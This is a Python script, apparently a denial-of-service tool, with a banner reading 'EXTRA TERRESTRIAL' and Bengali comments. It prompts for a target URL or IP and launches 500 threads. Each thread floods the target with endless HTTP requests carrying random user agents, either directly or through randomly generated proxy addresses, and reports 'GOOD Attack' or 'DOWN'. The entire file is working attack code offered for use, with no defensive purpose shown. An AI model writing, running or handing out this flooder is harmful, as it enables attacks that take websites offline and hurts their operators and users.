import threading
import urllib.request
import random
from user_agent import generate_user_agent
from urllib.request import ProxyHandler, build_opener
from pyfiglet import Figlet

# লাল রঙের কোড
F = '\033[1;31m'  # লাল রঙের কোড
Z = '\033[0m'  # রঙ রিসেট করার কোড
S = '\033[1;33m'  # হলুদ রঙের কোড
B = '\x1b[38;5;208m'  # অন্য রঙের কোড

# "𝐄𝐗𝐓𝐑𝐀 𝐓𝐄𝐑𝐑𝐄𝐒𝐓𝐑𝐈𝐀𝐋" বড় এবং লাল রঙে প্রিন্ট করার জন্য
fig = Figlet(font='slant')
banner = fig.renderText("𝐄𝐗𝐓𝐑𝐀 𝐓𝐄𝐑𝐑𝐄𝐒𝐓𝐑𝐈𝐀𝐋")

print(F + "═" * 50)
print(banner)
print("═" * 50 + Z)

def linked():
    sg = input(
        f'''
═════════════════════════════════
{Z}[1] Attack withOut Proxy - هجوم بدون بروكسي
═════════════════════════════════
{S}[2] Attack With Proxy - هجوم مع بروكسي 
═════════════════════════════════
{S}[{S}⌯{S}]{F}Choose Number {F}» '''
    )
    if sg == '1':
        for _ in range(500):
            threading.Thread(target=AttackMahos).start()
    elif sg == '2':
        for _ in range(500):
            threading.Thread(target=ProxyAttack).start()

def AttackMahos():
    while True:
        headers = {
            'User-Agent': generate_user_agent()
        }
        try:
            req = urllib.request.urlopen(
                urllib.request.Request(url, headers=headers)
            )
            if req.status == 200:
                print(f'{F}GOOD Attack: {url}')
            else:
                print(f'{Z}BAD Attack: {url}')
        except:
            print(f'{S}DOWN: {url}')

def ProxyAttack():
    while True:
        ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
        pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 443, 8080]
        port = random.choice(pl)
        proxy = f"{ip}:{port}"
        headers = {
            'User-Agent': generate_user_agent()
        }
        try:
            proxy_handler = ProxyHandler({'http': 'http://' + proxy})
            opener = build_opener(proxy_handler)
            req = opener.open(urllib.request.Request(url, headers=headers))
            if req.status == 200:
                print(f'{F}GOOD Attack: {url} | {proxy}')
            else:
                print(f'{Z}BAD Attack: {url} | {proxy}')
        except:
            print(f'{S}DOWN: {url} |')

url = input(f'{B}ENTER URL OR IP ADDRESS : ')
linked()